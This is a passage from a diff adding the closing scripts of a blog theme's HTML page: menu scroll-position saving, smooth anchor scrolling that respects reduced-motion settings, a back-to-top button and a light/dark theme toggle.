+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
